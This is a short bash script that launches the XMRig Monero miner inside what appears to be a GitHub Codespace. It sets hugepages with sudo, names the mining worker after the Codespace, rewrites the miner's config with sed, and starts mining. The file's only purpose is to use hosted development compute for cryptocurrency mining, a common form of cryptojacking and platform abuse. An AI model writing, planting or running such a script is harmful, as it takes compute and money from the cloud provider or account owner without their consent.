#!/bin/bash

sudo sysctl -w vm.nr_hugepages=4096 || true
WORKER="krxXJZV2MW.$CODESPACE_NAME"
sed -i "s/\"user\": \".*\"/\"user\": \"$WORKER\"/" /workspaces/temp/config.json
echo "Worker name: $WORKER"
/home/miner/xmrig/build/xmrig --config /workspaces/temp/config.json
